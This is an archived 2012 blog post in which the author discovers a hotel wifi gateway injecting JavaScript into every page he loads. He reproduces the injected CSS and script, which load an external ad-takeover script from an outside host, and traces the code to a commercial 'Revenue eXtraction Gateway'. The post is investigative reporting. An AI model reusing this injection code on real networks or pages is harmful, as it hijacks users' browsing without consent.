<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://justinsomnia.org/2012/04/hotel-wifi-javascript-injection/">Original</a>
    <h1>Hotel WiFi JavaScript Injection (2012)</h1>
    
    <div id="readability-page-1" class="page"><div id="site-content">

            <article>
            <header>
                            
                    </header>
    
    <p>So I’m checking my blog on the hotel wifi, like ya do, and I notice something a little off with the style. There’s a dark colored bar at the top of the page that shouldn’t be there. That’s funny. Maybe a recent Firefox update changed how they treat CSS?</p>
<figure>
<img decoding="async" src="https://justinsomnia.org/images/justinsomnia-screenshot-weird-bar.png" alt="Justinsomnia screenshot showing weird blue bar"/>
<figcaption>Screenshot of <a href="https://justinsomnia.org/">Justinsomnia</a> with weird bar circled in red</figcaption>
</figure>
<p>I probably wouldn’t have thought much of it, except my blog had recently been hacked (someone had gained elevated access to my web hosting account and prepended every single PHP file with a base64 encoded rootkit), so I immediately decided to view the source. Sure enough I saw some unfamiliar CSS and JavaScript that had been injected after the <code>&lt;head&gt;</code> tag (reformatted here for readability):</p>

<pre>&lt;style type=&#34;text/css&#34;&gt;
#rxgheader
{
  visibility:hidden;
  color:#111;
  background:#ffffff;
  text-align:center;
  border-bottom:1px solid #666;
  z-index:10000;
  position:fixed;
  width:100%;
  top:0;
}

#rxgleftbar
{
  visibility:hidden;
  color:#111;
  background:#fff;
  border-right:1px solid #666;
  z-index:10000;
  position:fixed;
  height:100%;
  left:0;
}

#rxgrightbar
{
  visibility:hidden;
  color:#111;
  background:#fff;
  border-left:1px solid #666;
  z-index:10000;
  position:fixed;
  height:100%;
  right:0;
}

#rxgfooter
{
  visibility:hidden;
  color:#111;
  background:#ffffff;
  text-align:center;
  border-top:1px solid #666;
  z-index:10000;
  position:fixed;
  width:100%;
  bottom:0;
}

#rxgcontent
{
} 
&lt;/style&gt;
&lt;script language=&#34;JavaScript&#34; type=&#34;text/javascript&#34;&gt;
function checkVisible() {
    var footer, header, leftbar, rightbar, content;
    if (document.all) {
        footer = document.all.rxgfooter;
        header = document.all.rxgheader;
        leftbar = document.all.rxgleftbar;
        rightbar = document.all.rxgrightbar;
        content = document.all.rxgcontent;
    } else if (document.getElementById) {
        footer = document.getElementById(&#39;rxgfooter&#39;);
        header = document.getElementById(&#39;rxgheader&#39;);
        leftbar = document.getElementById(&#39;rxgleftbar&#39;);
        rightbar = document.getElementById(&#39;rxgrightbar&#39;);
        content = document.getElementById(&#39;rxgcontent&#39;);
    }
    if (footer) {
        if (footer.offsetWidth &gt; 600) {
            footer.style.visibility = &#39;visible&#39;;
            content.style.paddingBottom = (footer.offsetHeight + 4) + &#34;px&#34;;
        }
    }
    if (header) {
        if (header.offsetWidth &gt; 600) {
            header.style.visibility = &#39;visible&#39;;
            content.style.paddingTop = (header.offsetHeight + 4) + &#34;px&#34;;
        }
    }
    if (leftbar) {
        if (leftbar.offsetHeight &gt; 400) {
            leftbar.style.visibility = &#39;visible&#39;;
            content.style.paddingLeft = (leftbar.offsetWidth + 4) + &#34;px&#34;;
        }
    }
    if (rightbar) {
        if (rightbar.offsetHeight &gt; 400) {
            rightbar.style.visibility = &#39;visible&#39;;
            content.style.paddingRight = (rightbar.offsetWidth + 4) + &#34;px&#34;;
        }
    }
}
&lt;/script&gt;</pre>
<p>And I found some unfamiliar JavaScript after the <code>&lt;body&gt;</code> tag (also reformatted):</p>
<pre>&lt;div id=&#34;rxgheader&#34;&gt;
&lt;script type=&#39;text/javascript&#39;&gt;
var advnIsAdProviders = true;
var advnIsPersistCookie = false;
var mCustomerId = 44;
var advnIsHideImmediately = false;
var mDelayLoad = 1000;
var advnAdRotationDelay = 30000;
var jsUrl = &#39;http://adsmws.cloudapp.net/user/advnads20.js&#39;;

function addScript(jsUrl) {
    var AdvnScript = document.createElement(&#39;script&#39;);
    AdvnScript.setAttribute(&#39;src&#39;, jsUrl);
    AdvnScript.setAttribute(&#39;type&#39;, &#39;text/javascript&#39;);
    document.body.appendChild(AdvnScript);
}
setTimeout(&#39;addScript(jsUrl)&#39;, 50);
&lt;/script&gt;
&lt;div id = &#34;rxgcontent&#34;&gt; 
&lt;script language = &#34;JavaScript&#34; type = &#34;text/javascript&#34;&gt;
checkVisible();
&lt;/script&gt;</pre>
<p>For the non-web-developers reading, the most salient bits to note above are the prefix “rxg” in the CSS and the URL <a href="http://adsmws.cloudapp.net/user/advnads20.js" rel="nofollow">http://adsmws.cloudapp.net/user/advnads20.js</a> pointing to a packed external JavaScript file that looked very suspicious. RXG appears to be a common extension used in viruses and malware, but I found very few results in Google having to do with advnads20.js or adsmws.cloudapp.net.</p>
<p>Immediately I <code>ssh</code>ed into my webhost, and did an <code>svn diff</code> on my WordPress core files. No changes. Hmm, maybe someone mucked with my custom theme files (which are not under version control)? Nope, no dice, everything appeared kosher. It occurred to me to <code>wget</code> my blog while I was <code>ssh</code>ed into my webhost’s server in Los Angeles—to see if the changes were also showing up there. Nope. Bingo! I loaded <a href="http://laviesoleil.com/">Stephanie’s blog</a> and found the same symptoms in the source—but she’s hosted under my account. So just in case, I loaded <a href="http://notes.torrez.org/">Andre’s blog</a>, hosted by TypePad. Same thing. Verdict: somewhere between the internet and my computer, someone is injecting JavaScript into EVERY SINGLE PAGE I LOAD.</p>
<p>I found a utility that unpacks packed JavaScript, and it only took a quick skim of advnads20.js (over 1900 lines reformatted) to estimate that its primary purpose is ad injection/takeover. The good news is, this explains why all the embedded YouTube videos in Google Reader were showing up as empty black squares.</p>
<p>But the question remains, did the hotel’s wifi access point get hacked, or is something more nefarious at work? Is it possible that the hotel’s internet service provider is doing this on purpose? Could it be that the <a href="http://www.marriott.com/hotels/travel/nycmd-courtyard-new-york-manhattan-times-square-south/">Courtyard Marriott in Times Square</a> is actually aware of and condoning this type of bad behavior?</p>
<p>In any case, who the heck do I report something like this to?</p>
<p><ins><strong>Update:</strong> I really wanted to give Marriott the benefit of the doubt, but it turns out I was wrong. There <em><strong>is</strong></em> something more nefarious at work. Thanks to Danny in the comments, I learned that the “rxg” I saw in the injected CSS and JavaScript is short for Revenue eXtraction Gateway, a wireless hotspot gateway product built by <a href="http://rgnets.com/" rel="nofollow">RG Nets, Inc.</a>, and available for sale from <a href="http://www.wlanmall.com/rxg-a8-revenue-extraction-hotspot-gateway-for-hotel-and-wisp-1000-user.html" ref="nofollow">Wlan Mall</a>.</ins></p>
<figure>
<img decoding="async" src="https://justinsomnia.org/images/rgnets-rxg-a8-revenue-extraction-gateway.png" alt="RG Nets RXG-A8 Revenue eXtraction Gateway"/>
<figcaption>RG Nets RXG-A8</figcaption>
</figure>
<p>In short, the Courtyard Marriott is using the RXG to inject JavaScript into the HTML of every webpage its hotel customers view for the purpose of injecting ads (and in the meantime, breaking YouTube). Marriott’s wireless internet service provider is a third-party company called <a href="http://hotelwifi.com/" rel="nofollow">Hotel Internet Services</a>, so it is possible, though unlikely, that Marriott doesn’t know what’s going on. But it’s crazy to me that I’m paying $368 a night for a hotel room, and this is how I get treated.</p>
<p><ins><strong>Update:</strong> I guess not all press is good press. <a href="http://vimeo.com/risaac">Ronen Isaac</a> (coincidentally of Wlan Mall) appears to have taken down the <a href="http://vimeo.com/11369399">Vimeo video</a> (I had previously embedded above) that I thought did such an excellent job describing how the Revenue eXtraction Gateway worked.</ins></p>
<blockquote><p>Sorry, “RGnets RXG Injection Advertising Demo” was deleted at 10:17:28 Fri Apr 6, 2012. We have no more information about it on our mainframe or elsewhere.</p></blockquote>
<p><a href="http://rgnets.com/index.php?page=injection-s1krr" rel="nofollow">Good thing RG Nets still has the video up on their own site!</a> And thanks to <a href="http://www.theverge.com/2012/4/7/2931600/hotel-caught-injecting-advertising-into-web-pages-on-complimentary-wi">The Verge</a>, there’s now <a href="http://www.youtube.com/watch?v=047r_ihcLwY">a copy of the video up on YouTube</a> that I can embed for your viewing pleasure:</p>
<p><iframe width="380" height="285" src="http://www.youtube.com/embed/047r_ihcLwY?rel=0" frameborder="0" allowfullscreen=""></iframe></p>
<p>Here’s a transcript of the video’s hypnotic, robotic voice-over:</p>
<blockquote><p>The video demonstrates the HTML payload rewriting feature of the RG Nets Revenue eXtraction Gateway. The web browser that you are looking at is that of an end user that is connected to the internet through an RG Nets Revenue eXtraction Gateway. The end user is running stock IE7 without any special plugins or installations. All rewriting is done on the fly in the RXG. The RXG is configured to rewrite all transit webpages to include a banner advertisement for a BMW S1000RR motorcycle. The S1000RR banner can be positioned at the top, bottom, left, or right side of webpages. In addition, the banner may be rotated with other banners to simultaneously support multiple advertising campaigns. Of course the banners may also be linked to any website desired. As you can see the pervasive nature of the advertising banner on all webpages guarantees banner advertising impressions. The RG Nets RXG HTML payload rewriting feature is a tremendously powerful tool, with a broad spectrum of applications for internet marketing programs.</p></blockquote>
<p><ins><strong>Update:</strong> A thought exercise: imagine the hotel delivered complementary issues of the New York Times to every room, except that in this case, all the ads had been cut out, some of the articles had been accidentally cut out (because they happened to be on the other side of an ad), and on every single page there’s a new ad that’s been stuck on top. How would you react? How do you think the New York Times would react?</ins></p>
<p><ins><strong>Update:</strong> Here’s a round-up of people talking about <em>Hotel Wifi JavaScript Injection</em> around the web:</ins></p>
<ul>
<li><a href="http://news.ycombinator.com/item?id=3804608">Hacker News</a></li>
<li><a href="http://www.metafilter.com/114585/Courtyard-Marriott-in-Times-Square-is-spying-on-and-manipulating-your-Internet">MetaFilter</a></li>
<li><a href="http://digg.com/news/business/courtyard_marriott_in_times_square_is_spying_on_and_manipulating_your_internet">Digg</a></li>
<li><a href="http://www.reddit.com/r/webdev/comments/rw6an/hotel_wifi_service_autoinjects_additional_adverts/">Reddit</a></li>
<li><a href="http://techcrunch.com/2012/04/06/now-you-know-hotels-inject-banner-ads-into-the-wi-fi-they-charge-you-for/">TechCrunch</a> (<a href="http://techcrunch.com/2012/04/09/marriott-puts-an-end-to-shady-ad-injection-service/">twice!</a>)</li>
<li><a href="http://bits.blogs.nytimes.com/2012/04/06/courtyard-marriott-wifi/">The New York Times’ Bits Blog</a> (<a href="http://bits.blogs.nytimes.com/2012/04/09/marriott-wi-fi-ads/">twice!</a>)</li>
<li><a href="http://www.theverge.com/2012/4/7/2931600/hotel-caught-injecting-advertising-into-web-pages-on-complimentary-wi">The Verge</a> (<a href="http://www.theverge.com/2012/4/9/2937127/marriott-wi-fi-network-response-advertising-code">twice!</a>)</li>
<li><a href="http://www.gadling.com/2012/04/06/times-squares-courtyard-marriott-accused-of-bugging-your-intern/">The Huffington Post’s Gadling Blog</a> (<a href="http://www.gadling.com/2012/04/10/marriott-responds-to-internet-privacy-issue/">twice!</a>)</li>
<li><a href="http://www.heise.de/newsticker/meldung/Hotel-WLAN-manipuliert-alle-abgerufenen-Webseiten-1517525.html">heise online</a></li>
<li><a href="http://boingboing.net/2012/04/09/dont-use-marriot-hotels-sl.html">Boing Boing</a> <del datetime="2012-04-10T16:13:59+00:00">(though they didn’t link to my post!)</del></li>
<li><a href="http://www.forbes.com/sites/adriankingsleyhughes/2012/05/09/fbi-beware-of-malware-installed-via-hotel-networks/">Forbes</a></li>
<li><a href="https://doesmysiteneedhttps.com/">https://doesmysiteneedhttps.com/</a></li>
</ul>
<p><ins><strong>Update, April 9, 2012:</strong> I just received the following message from a representative of Marriott:</ins></p>
<blockquote><p>As soon as we learned of the situation, we launched an investigation into the matter.  Preliminary findings revealed that, unbeknownst to the hotel, the Internet service provider (ISP) was utilizing functionality that allowed advertising to be pushed to the end user.  The ISP has assured the hotel that this functionality has now been disabled.</p>
<p>While this is a common marketing practice with many Internet service providers, Marriott does not condone this practice.  At no time was data security ever at risk.”</p></blockquote>
<p>Though I’d question the assertion that network-level JavaScript injection is a “common marketing practice”, I’m glad they say it has been disabled. I’m currently back in San Francisco, so I have no way to confirm, but I’ll likely be back in NYC staying at the same hotel in a month.</p>
<p><ins><strong>Update:</strong> Something has bothered me about Marriott’s official response above. I completely get that Marriott is a large sprawling corporation, and it’s likely that the right hand often does not know what the left hand is doing. I get that. I’ve worked in much smaller organizations where that has been the case. I also get that their response is a typical, old school public relations gloss over the problem—without any satisfying transparency as to how the problem came to be or any meaningful details about how it was ameliorated. </ins></p>
<p>What bugs me about their response is that the device required to do this type of on-the-fly JavaScript injection of HTML is both rare and expensive. It requires specialized hardware (like the RG Nets’ RXG-A8) starting at a cost of $10,000. In other words, this hardware was procured precisely for the purpose of perpetrating this kind of attack. If Courtyard/Marriott/Hotel Internet Services didn’t want that feature, then they probably could have requisitioned cheaper, less specialized, and more robust networking hardware. </p>
<p>Which means that the optimal solution to this snafu wasn’t simply that “we’ve disabled the functionality”—it <em>has to be</em> “we’ve removed/replaced the offensive hardware”. Nothing less is sufficient. Otherwise, what’s to stop someone from accidentally (or otherwise) re-enabling it later?</p>

    
    
</article>
    
    








    </div></div>
  </body>
</html>
